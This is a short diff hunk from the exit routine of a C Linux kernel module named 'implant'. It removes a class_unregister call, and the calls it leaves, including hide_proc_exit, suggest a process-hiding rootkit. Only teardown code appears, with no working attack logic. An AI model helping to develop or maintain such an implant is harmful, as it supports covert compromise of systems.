@@ -144,7 +144,6 @@ static void __exit implant_exit(void)
 	hide_proc_exit();
 
 	device_destroy(implant_class, MKDEV(implant_major, 0));
-	class_unregister(implant_class);
 	class_destroy(implant_class);
 	unregister_chrdev(implant_major, IMPLANT_DEVICE_NAME);
 
